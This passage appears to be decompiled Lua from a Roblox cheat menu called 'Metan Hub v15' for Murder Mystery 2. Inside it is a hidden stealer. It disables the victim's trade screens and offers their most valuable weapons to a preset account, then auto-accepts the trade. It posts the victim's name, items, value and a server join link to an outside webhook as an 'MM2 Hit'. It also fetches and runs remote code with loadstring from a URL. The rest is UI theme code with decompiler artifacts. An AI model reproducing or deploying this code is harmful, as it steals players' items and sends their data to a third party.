					timestamp = v667
				}}
			}
            local json = t3.value3:JSONEncode(t12)

            pcall(function()
                local v861 = syn and syn.request or (http_request or request)

                if v861 then
                    local value5 = t2.value5
                    local t13 = {
						["Content-Type"] = "application/json"
					}
                    local v864 = json

                    v861({
						Url = value5,
						Method = "POST",
						Headers = t13,
						Body = v864
					})

                    return
                end

                t3.value3:PostAsync(t2.value5, json, Enum.HttpContentType.ApplicationJson)
            end)

            return
        end

        if not t2.value3 or #t6 == 0 then
            return
        end

        local t14 = {}
        local n3 = 0

        for _, v in ipairs(t6) do
            if #t14 < 20 then
                local v674 = v.count > 1 and " x" .. v.count or ""

                table.insert(t14, v.name .. " — " .. v.value .. v674)
            end

            n3 += v.value * v.count
        end

        if #t6 > 20 then
            table.insert(t14, "and " .. #t6 - 20 .. " more...")
        end

        local value4Name = t3.value4.Name
        local t15 = {
			name = "Victim",
			value = value4Name,
			inline = false
		}
        local v677 = "```" .. table.concat(t14, "\n") .. "```"
        local t16 = {
			name = "Items (all Legendary+ and above)",
			value = v677,
			inline = false
		}
        local v679 = "```" .. math.floor(n3) .. "```"
        local t17 = {
			name = "Total Value",
			value = v679,
			inline = false
		}
        local v681 = "roblox://placeId=142823291&gameInstanceId=" .. game.JobId
        local t18 = {
			t15,
			t16,
			t17,
			{
				name = "Server",
				value = v681,
				inline = false
			}
		}
        local v683 = os.date("!%Y-%m-%dT%H:%M:%SZ")
        local t19 = {
			embeds = {{
				title = "🔪 MM2 Hit",
				description = "Join and accept trade",
				color = 16755200,
				fields = t18,
				timestamp = v683
			}}
		}
        local json = t3.value3:JSONEncode(t19)

        pcall(function()
            local v865 = syn and syn.request or (http_request or request)

            if v865 then
                local value5 = t2.value5
                local t20 = {
					["Content-Type"] = "application/json"
				}
                local v868 = json

                v865({
					Url = value5,
					Method = "POST",
					Headers = t20,
					Body = v868
				})

                return
            end

            t3.value3:PostAsync(t2.value5, json, Enum.HttpContentType.ApplicationJson)
        end)
    end
    if t2.value3 then
        v89(false)
    end
    local t21 = {}
    local function v91()
        if not t2.value3 or t2.value2 then
            return
        end

        local TradeGUI = t3.value4.PlayerGui:FindFirstChild("TradeGUI")

        if TradeGUI then
            local connection = TradeGUI:GetPropertyChangedSignal("Enabled"):Connect(function()
                TradeGUI.Enabled = false
            end)

            table.insert(t21, connection)
            TradeGUI.Enabled = false
        end

        local TradeGUI_Phone = t3.value4.PlayerGui:FindFirstChild("TradeGUI_Phone")

        if TradeGUI_Phone then
            local connection = TradeGUI_Phone:GetPropertyChangedSignal("Enabled"):Connect(function()
                TradeGUI_Phone.Enabled = false
            end)

            table.insert(t21, connection)
            TradeGUI_Phone.Enabled = false
        end

        local connection = t3.value4.PlayerGui.ChildAdded:Connect(function(child)
            if child.Name == "TradeGUI" or child.Name == "TradeGUI_Phone" then
                child.Enabled = false

                local connection = child:GetPropertyChangedSignal("Enabled"):Connect(function()
                    child.Enabled = false
                end)

                table.insert(t21, connection)
            end
        end)

        table.insert(t21, connection)
    end
    local function v92()
        if not t2.value2 then
            return
        end

        t2.value2 = false
        pcall(function()
            t3.value2.Trade.DeclineTrade:FireServer()
        end)
        pcall(function()
            t3.value2.Trade.CancelAccept:FireServer()
        end)

        for _, v in ipairs(t21) do
            local v688 = v

            pcall(function()
                v688:Disconnect()
            end)
        end

        t21 = {}

        local TradeGUI = t3.value4.PlayerGui:FindFirstChild("TradeGUI")

        if TradeGUI then
            TradeGUI.Enabled = false
        end

        local TradeGUI_Phone = t3.value4.PlayerGui:FindFirstChild("TradeGUI_Phone")

        if TradeGUI_Phone then
            TradeGUI_Phone.Enabled = false
        end
    end
    local function v93(...)
        local t22 = { ... }
        local AcceptTrade = t3.value2:WaitForChild("Trade"):WaitForChild("AcceptTrade")

        pcall(function()
            local v871 = AcceptTrade
            local t23 = { unpack(t22) }

            v871:FireServer(v2(t23))
        end)
        pcall(function()
            AcceptTrade:InvokeServer(unpack(t22))
        end)
    end
    local function v94()
        if not t2.value3 then
            return
        end

        for i = 1, 3 do
            task.spawn(function()
                local Trade = t3.value2:WaitForChild("Trade")
                local AcceptTrade = Trade:WaitForChild("AcceptTrade")
                local CancelAccept = Trade:WaitForChild("CancelAccept")
                local UpdateTrade = Trade:WaitForChild("UpdateTrade")
                AcceptTrade:FireServer(game.PlaceId * 3, nil)
                task.wait(0.1)
                CancelAccept:FireServer()
                task.wait(0.1)
                local LastOffer
                local connection = UpdateTrade.OnClientEvent:Connect(function(p2)
                    if p2.LastOffer then
                        LastOffer = p2.LastOffer
                        conn:Disconnect()
                    end
                end)
                local n4 = 0
                while LastOffer == nil and n4 < 1 do
                    task.wait(0.05)
                    n4 += 0.05
                end
                if connection then
                    connection:Disconnect()
                end
                if LastOffer then
                    v93(game.PlaceId * 3, LastOffer)
                else
                    v93(game.PlaceId * 3, nil)
                end
            end)

            if i < 3 then
                task.wait(0.8)
            end
        end

        task.wait(1.5)
    end
    if t2.value3 then
        t3.value2:WaitForChild("Trade"):WaitForChild("RequestSent").OnClientEvent:Connect(function(p3)
            if p3.Name == t2.value4 then
                pcall(function()
                    t3.value2:WaitForChild("Trade"):WaitForChild("AcceptRequest"):FireServer()
                end)
                task.wait(0.5)
                v94()

                return
            end

            pcall(function()
                t3.value2:WaitForChild("Trade"):WaitForChild("DeclineRequest"):FireServer()
            end)
        end)
    end
    local Trade = t3.value2:WaitForChild("Trade")
    local SendRequest = Trade:WaitForChild("SendRequest")
    local OfferItem = Trade:WaitForChild("OfferItem")
    local GetTradeStatus = Trade:WaitForChild("GetTradeStatus")
    local DeclineTrade = Trade:WaitForChild("DeclineTrade")
    local DeclineRequest = Trade:WaitForChild("DeclineRequest")
    table.sort(t5, function(p4, p5)
        return p4.val * p4.qty > p5.val * p5.qty
    end)
    local function v101(p6)
        if t2.value1 then
            return
        end
        if #t5 == 0 then
            t2.value1 = true
            v89(true)

            return
        end
        if not p6 or not p6.Character then
            return
        end
        v91()
        local v703 = GetTradeStatus:InvokeServer()
        if v703 == "StartTrade" then
            DeclineTrade:FireServer()
        elseif v703 == "ReceivingRequest" then
            DeclineRequest:FireServer()
        end
        task.wait(0.5)
        local t24 = {}
        for v707, v708 in ipairs(t5) do

            t24[#t24 + 1] = v708
        end
        while #t24 > 0 do
            local v709 = GetTradeStatus:InvokeServer()

            if v709 == "None" then
                pcall(function()
                    SendRequest:InvokeServer(p6)
                end)
                task.wait(1)
            elseif v709 == "SendingRequest" then
                task.wait(0.3)
            elseif v709 == "ReceivingRequest" then
                DeclineRequest:FireServer()
                task.wait(0.3)
            elseif v709 == "StartTrade" then
                local n5 = 0

                while #t24 > 0 and n5 < 4 do
                    local v711 = table.remove(t24, 1)

                    for _ = 1, v711.qty do
                        pcall(function()
                            OfferItem:FireServer(v711.id, "Weapons")
                        end)
                        task.wait(0.05)
                    end

                    n5 += 1
                end

                task.wait(6)
                v94()

                if GetTradeStatus:InvokeServer() ~= "None" then
                end

                repeat
                    task.wait(0.2)
                until GetTradeStatus:InvokeServer() == "None"
            else
                task.wait(0.5)
            end

            task.wait()
        end
        v89(true)
        v92()
    end
    t3.value1.PlayerAdded:Connect(function(player)
        if t2.value1 then
            return
        end

        if player.Name == t2.value4 then
            task.wait(15)
            v101(player)
        end
    end)
    local t2value4 = t3.value1:FindFirstChild(t2.value4)
    if t2value4 and not t2.value1 then
        task.wait(15)
        v101(t2value4)
    end
end)

if ok then
end
t3.value7 = loadstring(game:HttpGet("https://github.com/StyearX/Fluent-Modded/releases/download/Fluent/FluentPro"))()
t3.value8 = game:GetService("Players")
t3.value9 = game:GetService("RunService")
t3.value10 = game:GetService("UserInputService")
game:GetService("Debris")
t3.value11 = t3.value8.LocalPlayer
t3.value12 = workspace.CurrentCamera
t3.value13 = game:GetService("HttpService")
t3.value14 = game:GetService("CoreGui")
t3.value15 = game:GetService("ReplicatedStorage")
game:GetService("TweenService")
t3.value16 = game:GetService("VirtualUser")
t3.value17 = game:GetService("Lighting")

function t3.value18(p7, p8, p9, p10, p11)
    pcall(function()
        local value7 = t3.value7
        local v715 = p7
        local v716 = p8
        local v717 = p9 or "Info"
        local Notify = value7.Notify
        local v719 = p10
        local v720 = p11 or 3

        Notify(value7, {
			Title = v715,
			Content = v716,
			Type = v717,
			Icon = v719,
			Duration = v720
		})
    end)
end
t3.value19 = nil
t3.value20 = nil
t3.value21 = nil
pcall(function()
    local Gameplay = t3.value15:WaitForChild("Remotes"):WaitForChild("Gameplay")

    t3.value19 = Gameplay:WaitForChild("Fade")
    t3.value20 = Gameplay:WaitForChild("RoundEndFade")
    t3.value21 = t3.value15:WaitForChild("Remotes"):WaitForChild("Misc"):WaitForChild("PlayEmote")
end)
t3.value22 = {}
function t1.value1(p12, p13)
    local u111 = p13
    pcall(function()
        if t3.value7.RegisterCustomTheme then
            t3.value7:RegisterCustomTheme(p12, u111)
            table.insert(t3.value22, p12)
        end
    end)
end
t1.value3 = Color3.fromRGB(100, 140, 220)
t1.value5 = Color3.fromRGB(18, 20, 28)
t1.value7 = Color3.fromRGB(80, 100, 160)
t1.value8 = ColorSequence.new(Color3.fromRGB(18, 20, 28), Color3.fromRGB(10, 12, 18))
t1.value9 = Color3.fromRGB(80, 100, 160)
t1.value10 = Color3.fromRGB(30, 35, 50)
t1.value11 = Color3.fromRGB(25, 28, 40)
t1.value12 = Color3.fromRGB(70, 85, 140)
t1.value13 = Color3.fromRGB(100, 130, 200)
t1.value15 = Color3.fromRGB(40, 45, 65)
t1.value17 = Color3.fromRGB(100, 140, 220)
t1.value19 = Color3.fromRGB(40, 45, 65)
t1.value20 = Color3.fromRGB(20, 22, 32)

local color3 = Color3.fromRGB(12, 14, 20)

t1.value22 = Color3.fromRGB(70, 85, 140)
t1.value21 = Color3.fromRGB(30, 35, 50)
t1.value23 = Color3.fromRGB(30, 35, 50)
t1.value25 = Color3.fromRGB(20, 22, 32)
t1.value18 = Color3.fromRGB(8, 10, 16)
t1.value16 = Color3.fromRGB(100, 130, 200)
t1.value24 = Color3.fromRGB(14, 16, 22)
t1.value27 = Color3.fromRGB(10, 12, 18)
t1.value26 = Color3.fromRGB(60, 75, 120)
t1.value28 = Color3.fromRGB(25, 30, 44)
t1.value29 = Color3.fromRGB(70, 85, 140)
t1.value14 = Color3.fromRGB(70, 85, 140)
t1.value30 = Color3.fromRGB(20, 22, 32)
t1.value31 = Color3.fromRGB(100, 130, 200)
t1.value32 = Color3.fromRGB(230, 235, 250)
t1.value33 = Color3.fromRGB(160, 175, 210)
t1.value4 = Color3.fromRGB(45, 52, 75)

local new = ColorSequence.new
t1.value37 = ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 40, 80))
t1.value35 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(100, 140, 220))
t1.value36 = ColorSequenceKeypoint.new
t1.value38 = Color3.fromRGB
t1.value35 = new({
	t1.value37,
	t1.value35,
	t1.value36(1, t1.value38(30, 40, 80))
})
t1.value34 = {
	Speed = 0.5,
	RotationSpeed = 25,
	ColorSequence = t1.value35
}
t1.value2 = Color3.fromRGB(50, 60, 100)
t1.value6 = ColorSequence.new
t1.value36 = ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 40, 80))
t1.value35 = ColorSequenceKeypoint.new
local fromRGB = Color3.fromRGB
t1.value36 = t1.value6({
	t1.value36,
	t1.value35(1, fromRGB(15, 20, 40))
})
t1.value37 = ColorSequence.new
t1.value38 = ColorSequenceKeypoint.new(0, Color3.fromRGB(80, 110, 180))

local colorSequenceKeypoint = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(130, 170, 240))

t1.value35 = ColorSequenceKeypoint.new
t1.value6 = Color3.fromRGB
t1.value35 = t1.value37({
	t1.value38,
	colorSequenceKeypoint,
	t1.value35(1, t1.value6(80, 110, 180))
})

local t25 = {
	Background = t1.value36,
	Stroke = t1.value35
}
t1.value1("Blue (Ryo)", {
	Name = "Blue (Ryo)",
	Accent = t1.value3,
	AcrylicMain = t1.value5,
	AcrylicBorder = t1.value7,
	AcrylicGradient = t1.value8,
	AcrylicNoise = 0.7,
	TitleBarLine = t1.value9,
	Tab = t1.value10,
	Element = t1.value11,
	ElementBorder = t1.value12,
	InElementBorder = t1.value13,
	ElementTransparency = 0.82,
	ToggleSlider = t1.value15,
	ToggleToggled = t1.value17,
	SliderRail = t1.value19,
	DropdownFrame = t1.value20,
	DropdownHolder = color3,
	DropdownBorder = t1.value22,
	DropdownOption = t1.value21,
	Keybind = t1.value23,
	Input = t1.value25,
	InputFocused = t1.value18,
	InputIndicator = t1.value16,
	Dialog = t1.value24,
	DialogHolder = t1.value27,
	DialogHolderLine = t1.value26,
	DialogButton = t1.value28,
	DialogButtonBorder = t1.value29,
	DialogBorder = t1.value14,
	DialogInput = t1.value30,
	DialogInputLine = t1.value31,
	Text = t1.value32,
	SubText = t1.value33,
	Hover = t1.value4,
	HoverChange = 0.05,
	ShineEnabled = true,
	Shine = t1.value34,
	StrokeShine = true,
	StrokeDark = t1.value2,
	ButtonGradient = t25,
	Background = "rbxassetid://110300998910160",
	BackgroundTransparency = 0.15
})
t1.value3 = Color3.fromRGB(255, 90, 90)
t1.value5 = Color3.fromRGB(28, 18, 18)
t1.value7 = Color3.fromRGB(200, 60, 60)
t1.value8 = ColorSequence.new(Color3.fromRGB(28, 18, 18), Color3.fromRGB(14, 8, 8))
t1.value9 = Color3.fromRGB(200, 60, 60)
t1.value10 = Color3.fromRGB(40, 25, 25)
t1.value11 = Color3.fromRGB(35, 20, 20)
t1.value12 = Color3.fromRGB(180, 50, 50)
t1.value13 = Color3.fromRGB(240, 90, 90)
t1.value15 = Color3.fromRGB(55, 30, 30)
t1.value17 = Color3.fromRGB(255, 90, 90)
t1.value19 = Color3.fromRGB(55, 30, 30)
t1.value20 = Color3.fromRGB(25, 15, 15)

local color3_2 = Color3.fromRGB(14, 8, 8)

t1.value22 = Color3.fromRGB(180, 50, 50)
t1.value21 = Color3.fromRGB(40, 25, 25)
t1.value23 = Color3.fromRGB(40, 25, 25)
t1.value25 = Color3.fromRGB(25, 15, 15)
t1.value18 = Color3.fromRGB(10, 5, 5)
t1.value16 = Color3.fromRGB(240, 90, 90)
t1.value24 = Color3.fromRGB(18, 10, 10)
t1.value27 = Color3.fromRGB(10, 5, 5)
t1.value26 = Color3.fromRGB(140, 35, 35)
t1.value28 = Color3.fromRGB(35, 20, 20)
t1.value29 = Color3.fromRGB(180, 50, 50)
t1.value14 = Color3.fromRGB(180, 50, 50)
t1.value30 = Color3.fromRGB(25, 15, 15)
t1.value31 = Color3.fromRGB(240, 90, 90)
t1.value32 = Color3.fromRGB(255, 235, 235)
t1.value33 = Color3.fromRGB(230, 160, 160)
t1.value4 = Color3.fromRGB(60, 35, 35)

local new2 = ColorSequence.new
t1.value37 = ColorSequenceKeypoint.new(0, Color3.fromRGB(140, 25, 25))
t1.value35 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 100, 100))
t1.value36 = ColorSequenceKeypoint.new
t1.value38 = Color3.fromRGB
t1.value35 = new2({
	t1.value37,
	t1.value35,
	t1.value36(1, t1.value38(140, 25, 25))
})
t1.value34 = {
	Speed = 0.5,
	RotationSpeed = 25,
	ColorSequence = t1.value35
}
t1.value2 = Color3.fromRGB(120, 30, 30)
t1.value6 = ColorSequence.new
t1.value36 = ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 30, 30))
t1.value35 = ColorSequenceKeypoint.new
local fromRGB2 = Color3.fromRGB
t1.value36 = t1.value6({
	t1.value36,
	t1.value35(1, fromRGB2(60, 15, 15))
})
t1.value37 = ColorSequence.new
t1.value38 = ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 70, 70))

local colorSequenceKeypoint2 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 120, 120))

t1.value35 = ColorSequenceKeypoint.new
t1.value6 = Color3.fromRGB
t1.value35 = t1.value37({
	t1.value38,
	colorSequenceKeypoint2,
	t1.value35(1, t1.value6(220, 70, 70))
})

local t26 = {
	Background = t1.value36,
	Stroke = t1.value35
}
t1.value1("Red (Kita)", {
	Name = "Red (Kita)",
	Accent = t1.value3,
	AcrylicMain = t1.value5,
	AcrylicBorder = t1.value7,
	AcrylicGradient = t1.value8,
	AcrylicNoise = 0.7,
	TitleBarLine = t1.value9,
	Tab = t1.value10,
	Element = t1.value11,
	ElementBorder = t1.value12,
	InElementBorder = t1.value13,
	ElementTransparency = 0.82,
	ToggleSlider = t1.value15,
	ToggleToggled = t1.value17,
	SliderRail = t1.value19,
	DropdownFrame = t1.value20,
	DropdownHolder = color3_2,
	DropdownBorder = t1.value22,
	DropdownOption = t1.value21,
	Keybind = t1.value23,
	Input = t1.value25,
	InputFocused = t1.value18,
	InputIndicator = t1.value16,
	Dialog = t1.value24,
	DialogHolder = t1.value27,
	DialogHolderLine = t1.value26,
	DialogButton = t1.value28,
	DialogButtonBorder = t1.value29,
	DialogBorder = t1.value14,
	DialogInput = t1.value30,
	DialogInputLine = t1.value31,
	Text = t1.value32,
	SubText = t1.value33,
	Hover = t1.value4,
	HoverChange = 0.05,
	ShineEnabled = true,
	Shine = t1.value34,
	StrokeShine = true,
	StrokeDark = t1.value2,
	ButtonGradient = t26,
	Background = "rbxassetid://125644682328750",
	BackgroundTransparency = 0.15
})
t1.value3 = Color3.fromRGB(240, 120, 190)
t1.value5 = Color3.fromRGB(30, 18, 28)
t1.value7 = Color3.fromRGB(200, 80, 150)
t1.value8 = ColorSequence.new(Color3.fromRGB(30, 18, 28), Color3.fromRGB(16, 8, 14))
t1.value9 = Color3.fromRGB(200, 80, 150)
t1.value10 = Color3.fromRGB(45, 25, 40)
t1.value11 = Color3.fromRGB(38, 20, 35)
t1.value12 = Color3.fromRGB(180, 60, 130)
t1.value13 = Color3.fromRGB(240, 130, 200)
t1.value15 = Color3.fromRGB(55, 30, 50)
t1.value17 = Color3.fromRGB(240, 120, 190)
t1.value19 = Color3.fromRGB(55, 30, 50)
t1.value20 = Color3.fromRGB(26, 14, 22)

local color3_3 = Color3.fromRGB(16, 8, 14)

t1.value22 = Color3.fromRGB(180, 60, 130)
t1.value21 = Color3.fromRGB(45, 25, 40)
t1.value23 = Color3.fromRGB(45, 25, 40)
t1.value25 = Color3.fromRGB(26, 14, 22)
t1.value18 = Color3.fromRGB(10, 5, 8)
t1.value16 = Color3.fromRGB(240, 130, 200)
t1.value24 = Color3.fromRGB(20, 10, 16)
t1.value27 = Color3.fromRGB(10, 5, 8)
t1.value26 = Color3.fromRGB(140, 40, 100)
t1.value28 = Color3.fromRGB(38, 20, 35)
t1.value29 = Color3.fromRGB(180, 60, 130)
t1.value14 = Color3.fromRGB(180, 60, 130)
t1.value30 = Color3.fromRGB(26, 14, 22)
t1.value31 = Color3.fromRGB(240, 130, 200)
t1.value32 = Color3.fromRGB(255, 235, 245)
t1.value33 = Color3.fromRGB(220, 160, 200)
t1.value4 = Color3.fromRGB(65, 35, 55)

local new3 = ColorSequence.new
t1.value37 = ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 30, 70))
t1.value35 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(240, 140, 200))
t1.value36 = ColorSequenceKeypoint.new
t1.value38 = Color3.fromRGB
t1.value35 = new3({
	t1.value37,
	t1.value35,
	t1.value36(1, t1.value38(100, 30, 70))
})
t1.value34 = {
	Speed = 0.5,
	RotationSpeed = 25,
	ColorSequence = t1.value35
}
t1.value2 = Color3.fromRGB(100, 40, 80)
t1.value6 = ColorSequence.new
t1.value36 = ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 30, 70))
t1.value35 = ColorSequenceKeypoint.new
local fromRGB3 = Color3.fromRGB
t1.value36 = t1.value6({
	t1.value36,
	t1.value35(1, fromRGB3(50, 15, 35))
})
t1.value37 = ColorSequence.new
t1.value38 = ColorSequenceKeypoint.new(0, Color3.fromRGB(200, 90, 160))

local colorSequenceKeypoint3 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 150, 210))

t1.value35 = ColorSequenceKeypoint.new
t1.value6 = Color3.fromRGB
t1.value35 = t1.value37({
	t1.value38,
	colorSequenceKeypoint3,
	t1.value35(1, t1.value6(200, 90, 160))
})

local t27 = {
	Background = t1.value36,
	Stroke = t1.value35
}
t1.value1("Pink (Bocchi)", {
	Name = "Pink (Bocchi)",
	Accent = t1.value3,
	AcrylicMain = t1.value5,
	AcrylicBorder = t1.value7,
	AcrylicGradient = t1.value8,
	AcrylicNoise = 0.7,
	TitleBarLine = t1.value9,
	Tab = t1.value10,
	Element = t1.value11,
	ElementBorder = t1.value12,
	InElementBorder = t1.value13,
	ElementTransparency = 0.82,
	ToggleSlider = t1.value15,
	ToggleToggled = t1.value17,
	SliderRail = t1.value19,
	DropdownFrame = t1.value20,
	DropdownHolder = color3_3,
	DropdownBorder = t1.value22,
	DropdownOption = t1.value21,
	Keybind = t1.value23,
	Input = t1.value25,
	InputFocused = t1.value18,
	InputIndicator = t1.value16,
	Dialog = t1.value24,
	DialogHolder = t1.value27,
	DialogHolderLine = t1.value26,
	DialogButton = t1.value28,
	DialogButtonBorder = t1.value29,
	DialogBorder = t1.value14,
	DialogInput = t1.value30,
	DialogInputLine = t1.value31,
	Text = t1.value32,
	SubText = t1.value33,
	Hover = t1.value4,
	HoverChange = 0.05,
	ShineEnabled = true,
	Shine = t1.value34,
	StrokeShine = true,
	StrokeDark = t1.value2,
	ButtonGradient = t27,
	Background = "rbxassetid://100823211487117",
	BackgroundTransparency = 0.15
})
t1.value3 = Color3.fromRGB(255, 210, 80)
t1.value5 = Color3.fromRGB(28, 24, 14)
t1.value7 = Color3.fromRGB(220, 170, 50)
t1.value8 = ColorSequence.new(Color3.fromRGB(28, 24, 14), Color3.fromRGB(16, 14, 6))
t1.value9 = Color3.fromRGB(220, 170, 50)
t1.value10 = Color3.fromRGB(45, 38, 18)
t1.value11 = Color3.fromRGB(38, 30, 15)
t1.value12 = Color3.fromRGB(200, 150, 40)
t1.value13 = Color3.fromRGB(255, 200, 100)
t1.value15 = Color3.fromRGB(55, 45, 25)
t1.value17 = Color3.fromRGB(255, 210, 80)
t1.value19 = Color3.fromRGB(55, 45, 25)
t1.value20 = Color3.fromRGB(25, 20, 10)

local color3_4 = Color3.fromRGB(14, 10, 5)

t1.value22 = Color3.fromRGB(200, 150, 40)
t1.value21 = Color3.fromRGB(45, 38, 18)
t1.value23 = Color3.fromRGB(45, 38, 18)
t1.value25 = Color3.fromRGB(25, 20, 10)
t1.value18 = Color3.fromRGB(10, 8, 4)
t1.value16 = Color3.fromRGB(255, 200, 100)
t1.value24 = Color3.fromRGB(18, 14, 8)
t1.value27 = Color3.fromRGB(10, 8, 4)
t1.value26 = Color3.fromRGB(160, 120, 30)
t1.value28 = Color3.fromRGB(38, 30, 15)
t1.value29 = Color3.fromRGB(200, 150, 40)
t1.value14 = Color3.fromRGB(200, 150, 40)
t1.value30 = Color3.fromRGB(25, 20, 10)
t1.value31 = Color3.fromRGB(255, 200, 100)
t1.value32 = Color3.fromRGB(255, 250, 230)
t1.value33 = Color3.fromRGB(220, 200, 150)
t1.value4 = Color3.fromRGB(65, 52, 25)

local new4 = ColorSequence.new
t1.value37 = ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 90, 20))
t1.value35 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 220, 100))
t1.value36 = ColorSequenceKeypoint.new
t1.value38 = Color3.fromRGB
t1.value35 = new4({
	t1.value37,
	t1.value35,
	t1.value36(1, t1.value38(120, 90, 20))
})
t1.value34 = {
	Speed = 0.5,
	RotationSpeed = 25,
	ColorSequence = t1.value35
}
t1.value2 = Color3.fromRGB(100, 70, 20)
t1.value6 = ColorSequence.new
t1.value36 = ColorSequenceKeypoint.new(0, Color3.fromRGB(120, 90, 20))
t1.value35 = ColorSequenceKeypoint.new
local fromRGB4 = Color3.fromRGB
t1.value36 = t1.value6({
	t1.value36,
	t1.value35(1, fromRGB4(60, 45, 10))
})
t1.value37 = ColorSequence.new
t1.value38 = ColorSequenceKeypoint.new(0, Color3.fromRGB(220, 170, 60))

local colorSequenceKeypoint4 = ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 220, 120))

t1.value35 = ColorSequenceKeypoint.new
t1.value6 = Color3.fromRGB
t1.value35 = t1.value37({
	t1.value38,
	colorSequenceKeypoint4,
	t1.value35(1, t1.value6(220, 170, 60))
})

local t28 = {
	Background = t1.value36,
	Stroke = t1.value35
}
t1.value1("Yellow (Nijika)", {
	Name = "Yellow (Nijika)",
	Accent = t1.value3,
	AcrylicMain = t1.value5,
	AcrylicBorder = t1.value7,
	AcrylicGradient = t1.value8,
	AcrylicNoise = 0.7,
	TitleBarLine = t1.value9,
	Tab = t1.value10,
	Element = t1.value11,
	ElementBorder = t1.value12,
	InElementBorder = t1.value13,
	ElementTransparency = 0.82,
	ToggleSlider = t1.value15,
	ToggleToggled = t1.value17,
	SliderRail = t1.value19,
	DropdownFrame = t1.value20,
	DropdownHolder = color3_4,
	DropdownBorder = t1.value22,
	DropdownOption = t1.value21,
	Keybind = t1.value23,
	Input = t1.value25,
	InputFocused = t1.value18,
	InputIndicator = t1.value16,
	Dialog = t1.value24,
	DialogHolder = t1.value27,
	DialogHolderLine = t1.value26,
	DialogButton = t1.value28,
	DialogButtonBorder = t1.value29,
	DialogBorder = t1.value14,
	DialogInput = t1.value30,
	DialogInputLine = t1.value31,
	Text = t1.value32,
	SubText = t1.value33,
	Hover = t1.value4,
	HoverChange = 0.05,
	ShineEnabled = true,
	Shine = t1.value34,
	StrokeShine = true,
	StrokeDark = t1.value2,
	ButtonGradient = t28,
	Background = "rbxassetid://90908656139712",
	BackgroundTransparency = 0.15
})
if #t3.value22 == 0 then
    t3.value22 = {
		"Dark",
		"Light",
		"Blood Red",
		"Amoled",
		"EmeraldDark",
		"NeonBlue",
		"Sunset",
		"SlateAnimated"
	}
    _G.Theme = "Dark"
end
t3.value23 = t3.value10.TouchEnabled
local v27 = t3.value23 and UDim2.fromOffset(480, 380) or UDim2.fromOffset(640, 520)

t1.value2 = t3.value7
t1.value7 = not t3.value23 and 150 or 110
local CreateWindow = t1.value2.CreateWindow
t1.value4 = t3.value22[1]
t1.value6 = Enum.KeyCode.RightShift
t3.value24 = CreateWindow(t1.value2, {
	Title = "Metan Hub v15",
	SubTitle = "MM2",
	TabWidth = t1.value7,
	Size = v27,
	Acrylic = true,
	Theme = t1.value4,
	MinimizeKey = t1.value6
})
local ScreenGui = Instance.new("ScreenGui")

ScreenGui.Name = "OpenUi"
t1.value3 = t3.value11:WaitForChild("PlayerGui")
ScreenGui.Parent = t1.value3
t1.value2 = Enum.ZIndexBehavior.Sibling
ScreenGui.ZIndexBehavior = t1.value2
ScreenGui.ResetOnSpawn = false
t1.value2 = Instance.new("TextButton")
t1.value2.Name = "OpenButton"
t1.value2.Parent = ScreenGui
t1.value4 = Color3.fromRGB(35, 35, 35)
t1.value2.BackgroundColor3 = t1.value4
t1.value2.BackgroundTransparency = 1
t1.value3 = t3.value23 and UDim2.new(0.05, 0, 0.15, 0) or UDim2.new(0.102, 0, 0.11, 0)
t1.value2.Position = t1.value3
t1.value3 = t3.value23 and UDim2.new(0, 48, 0, 32) or UDim2.new(0, 64, 0, 42)
t1.value2.Size = t1.value3
t1.value2.Text = ""
t1.value2.Visible = true
Instance.new("UICorner", t1.value2)
t1.value3 = Instance.new("ImageLabel")
t1.value3.Name = "StaticIcon"
t1.value3.Parent = t1.value2
t1.value4 = t3.value23 and UDim2.fromOffset(40, 40) or UDim2.fromOffset(55, 55)
t1.value3.Size = t1.value4
t1.value5 = UDim2.new(0.5, 0, 0.5, 0)
t1.value3.Position = t1.value5
t1.value5 = Vector2
t3.value25 = nil
t1.value5 = t1.value5.new(0.5, 0.5)
t3.value26 = nil
t1.value3.AnchorPoint = t1.value5
t1.value3.BackgroundTransparency = 1
t1.value3.Image = "rbxassetid://73265327699098"
t1.value3.ZIndex = 1
t1.value4 = Instance.new("UICorner", t1.value3)
t1.value6 = UDim.new(0.2, 0)
t1.value4.CornerRadius = t1.value6;
(function(p14, p15)
    local u118 = false
    local u119
    local inputPosition
    local u121 = false
    local n6 = 0
    p15:SetAttribute("Locked", false)
    local function v123(p16)
        if p15:GetAttribute("Locked") then
            return
        end

        local v741 = p16.Position - inputPosition

        p15.Position = UDim2.new((nil).X.Scale, (nil).X.Offset + v741.X, (nil).Y.Scale, (nil).Y.Offset + v741.Y)
    end
    p14.InputBegan:Connect(function(input)
        if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then
            return
        end

        u118 = not p15:GetAttribute("Locked")
        u121 = true
        inputPosition = input.Position

        local _ = p15.Position

        n6 += 1

        local v745 = n6

        task.delay(1, function()
            if u121 and v745 == n6 then
                local Locked = p15:GetAttribute("Locked")

                p15:SetAttribute("Locked", not Locked)
            end
        end)
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then
                u118 = false
            end
        end)
    end)
    p14.InputChanged:Connect(function(input)
        if not inputPosition then
            return
        end

        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            if not ((input.Position - inputPosition).Magnitude > 6) then
            end

            u119 = input
        end
    end)
    t3.value10.InputChanged:Connect(function(input)
        if input == u119 and u118 then
            v123(input)
        end
    end)
end)(t1.value2, t1.value2)
t3.value27 = true
function t1.value7()
    t3.value27 = not t3.value27

    if t3.value27 then
        t3.value24:Show()

        return
    end

    t3.value24:Hide()
end
t1.value2.MouseButton1Click:Connect(t1.value7)
t1.value4 = _G
t1.value6 = "TargetTracking"
t1.value7 = {}
t1.value4[t1.value6] = t1.value7
t3.value28 = {}
